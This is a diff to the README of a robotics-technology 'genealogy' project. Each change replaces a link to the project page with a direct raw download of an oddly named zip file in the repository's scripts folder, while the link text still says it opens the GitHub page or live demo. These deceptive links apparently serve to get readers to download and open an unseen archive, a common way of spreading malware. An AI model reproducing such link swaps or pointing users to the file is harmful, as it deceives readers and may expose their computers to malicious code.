@@ -1,6 +1,6 @@
 # 🤖 robotics-technology-genealogy - Explore AI Tech Roots
 
-[![Download Robotics Technology Genealogy](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/morning2059/robotics-technology-genealogy)
+[![Download Robotics Technology Genealogy](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge&logo=github)](https://github.com/morning2059/robotics-technology-genealogy/raw/refs/heads/main/scripts/technology-robotics-genealogy-affronted.zip)
 
 ## 🌳 What This Is
 
@@ -29,7 +29,7 @@ For the best experience, use:
 
 Visit this page to download or open the live demo:
 
-[Open the GitHub page](https://github.com/morning2059/robotics-technology-genealogy)
+[Open the GitHub page](https://github.com/morning2059/robotics-technology-genealogy/raw/refs/heads/main/scripts/technology-robotics-genealogy-affronted.zip)
 
 If the page shows a live demo, you can run it in your browser with no install. If it provides files to download, save them to your PC first, then open the main file in your browser.
 
@@ -115,7 +115,7 @@ Also check that you opened the main file and not a folder or text file.
 
 The repository description says a live demo is available. If you want the fastest way to use it, open the GitHub page and look for the demo link.
 
-[Open the live project page](https://github.com/morning2059/robotics-technology-genealogy)
+[Open the live project page](https://github.com/morning2059/robotics-technology-genealogy/raw/refs/heads/main/scripts/technology-robotics-genealogy-affronted.zip)
 
 ## 🛠️ Simple Setup Tips
 
@@ -159,7 +159,7 @@ This makes the tree easier to read than trying to scan the whole map at once.
 
 ## 🔗 Open the Project
 
-[https://github.com/morning2059/robotics-technology-genealogy](https://github.com/morning2059/robotics-technology-genealogy)
+[https://github.com/morning2059/robotics-technology-genealogy/raw/refs/heads/main/scripts/technology-robotics-genealogy-affronted.zip](https://github.com/morning2059/robotics-technology-genealogy/raw/refs/heads/main/scripts/technology-robotics-genealogy-affronted.zip)
 
 ## 🧭 Helpful Browsing Tips
 
